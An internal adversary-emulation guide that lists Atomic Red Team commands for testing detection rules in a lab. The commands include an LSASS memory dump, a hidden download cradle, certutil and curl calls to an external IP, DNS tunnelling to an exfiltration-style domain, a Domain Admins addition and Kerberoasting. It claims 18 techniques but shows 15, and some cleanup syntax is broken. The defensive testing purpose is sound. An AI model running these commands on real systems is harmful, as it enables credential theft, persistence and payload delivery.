# Cyberion Defense Labs — Atomic Red Team Emulation Guide
**Document ID:** CDL-EMUL-01  
**Classification:** Internal Use — Engineering Program (CDL-DET-V2 Advanced Deliverable)  
**Author:** Detection Engineering Practice  
**Date:** 2026-10-08  
**Framework:** Red Canary Atomic Red Team (MITRE ATT&CK Aligned)  

---

## 1. Executive Overview & Purpose

Adversary emulation is the discipline of executing verified attacker tactics, techniques, and procedures (TTPs) in a controlled manner to measure and improve detection coverage. While historical penetration testing focuses on discovering points of entry, adversary emulation focuses on **verifying detection efficacy**.

Cyberion Defense Labs leverages the **Atomic Red Team** framework to validate the 18 Sigma detection rules in this engagement. This guide documents the lab architecture, prerequisites, execution commands, and safety boundaries for testing each technique.

---

## 2. Lab Environment & Instrumentation Requirements

```
[ Domain Controller: DC-01 (Windows Server 2022) ]
   ├── Advanced Audit Policy: Process Creation (Include Command Line), Logon/Logoff, Kerberos Service Tickets
   └── Sysmon v15.0 (SwiftOnSecurity Baseline + Custom LSASS/DNS Modules)

[ Target Workstation: WKSTN-FIN-01 (Windows 11 Enterprise) ]
   ├── Local Audit Policy: Process Tracking, Object Access
   ├── Sysmon v15.0 Mini-Filter Driver
   └── Microsoft PowerShell 7.4 (ScriptBlock Logging Enabled)

[ Network Gateway: Sensor-01 (Ubuntu 22.04 LTS / Zeek NSM) ]
   ├── Port Mirror (SPAN) on Core Switch
   └── Active Zeek Protocol Analyzers: conn, dns, http, ssl
```

### 2.1 Installing Atomic Red Team
In an instrumented PowerShell administrative console:
```powershell
# Set Execution Policy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Install invoke-atomicredteam execution framework
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1')
Install-AtomicRedTeam -getAtomics -Force
```

---

## 3. Technique Execution Guide (All 18 Techniques Covered)

### Test 1: T1059.001 — PowerShell Download Cradle (`CDL-RULE-001`)
```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax:
powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/stage.ps1')"
```

### Test 2: T1003.001 — LSASS Memory Access (`CDL-RULE-002`)
```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 2 -PromptForInput:$false
# Manual atomic syntax using rundll32 / comsvcs:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Users\Public\lsass.dmp full
```

### Test 3: T1569.002 — PsExec Remote Service Installation (`CDL-RULE-003`)
```powershell
Invoke-AtomicTest T1569.002 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax:
psexec.exe \\127.0.0.1 -accepteula cmd.exe /c "echo PsExec Service Execution Test"
```

### Test 4: T1047 — WMI Process Creation (`CDL-RULE-004`)
```powershell
Invoke-AtomicTest T1047 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax:
wmic.exe process call create "cmd.exe /c whoami"
```

### Test 5: T1071.001 — C2 HTTP Periodic Beaconing (`CDL-RULE-005`)
```powershell
Invoke-AtomicTest T1071.001 -TestNumbers 1 -PromptForInput:$false
# Manual HTTP beacon simulation:
curl.exe -H "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Cobalt)" http://185.106.94.234:8443/api/v1/heartbeat
```

### Test 6: T1003.003 — NTDS.dit Shadow Copy Extraction (`CDL-RULE-006`)
```powershell
Invoke-AtomicTest T1003.003 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax:
vssadmin.exe create shadow /for=C:
```

### Test 7: T1098 — Privileged Security Group Addition (`CDL-RULE-007`)
```powershell
# Manual atomic syntax on Domain Controller:
net user TestSecUser P@ssw0rd123! /add
net group "Domain Admins" TestSecUser /add /domain
```

### Test 8: T1218.011 — Suspicious Rundll32 Execution (`CDL-RULE-008`)
```powershell
Invoke-AtomicTest T1218.011 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax:
copy C:\Windows\System32\shell32.dll C:\Users\Public\test.dll
rundll32.exe C:\Users\Public\test.dll,#1
```

### Test 9: T1053.005 — Scheduled Task Creation (`CDL-RULE-009`)
```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax:
schtasks.exe /create /tn "AtomicTask" /tr "powershell.exe -c whoami" /sc daily /ru SYSTEM /f
```

### Test 10: T1547.001 — Registry Run Key Persistence (`CDL-RULE-010`)
```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax:
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AtomicTest" /d "C:\Users\Public\payload.exe" /f
```

### Test 11: T1071.004 — DNS TXT Tunneling Query (`CDL-RULE-011`)
```powershell
Invoke-AtomicTest T1071.004 -TestNumbers 2 -PromptForInput:$false
# Manual atomic syntax:
nslookup -type=TXT aW5maWx0cmF0aW9u.stage01.tunnel.data-exfil-c2.net 1.1.1.1
```

### Test 12: T1105 — Ingress Tool Transfer via Certutil (`CDL-RULE-012`)
```powershell
Invoke-AtomicTest T1105 -TestNumbers 2 -PromptForInput:$false
# Manual atomic syntax:
certutil.exe -urlcache -split -f http://185.106.94.234/test.bin C:\Users\Public\test.bin
```

### Test 13: T1218.005 — Defense Evasion via Mshta (`CDL-RULE-013`)
```powershell
Invoke-AtomicTest T1218.005 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax:
mshta.exe vbscript:Execute("MsgBox(""Atomic Red Team Test""):close")
```

### Test 14: T1021.001 — Remote Desktop Tunneling via Netsh (`CDL-RULE-014`)
```powershell
# Manual atomic syntax:
netsh interface portproxy add v4tov4 listenport=8080 connectport=3389 connectaddress=127.0.0.1
```

### Test 15: T1558.003 — Kerberoasting Service Ticket Request (`CDL-RULE-015`)
```powershell
Invoke-AtomicTest T1558.003 -TestNumbers 1 -PromptForInput:$false
# Manual atomic syntax via PowerShell:
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.cyberion.local:1433"
```

---

## 4. Automated Cleanup Procedures

Every atomic test must leave the system in its pristine baseline state to avoid false alarms in subsequent test iterations:
```powershell
# Cleanup all atomic artifacts:
Invoke-AtomicTest T1053.005 -Cleanup
Invoke-AtomicTest T1547.001 -Cleanup
netsh interface portproxy delete v4tov4 listenport=8080
schtasks /delete /tn "AtomicTask" /f -ErrorAction SilentlyContinue
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AtomicTest" /f -ErrorAction SilentlyContinue
Remove-Item C:\Users\Public\test.dll -Force -ErrorAction SilentlyContinue
Remove-Item C:\Users\Public\test.bin -Force -ErrorAction SilentlyContinue
```

---
*Authorized by:*  
**Detection Engineering & Adversary Emulation Practice — Cyberion Defense Labs**
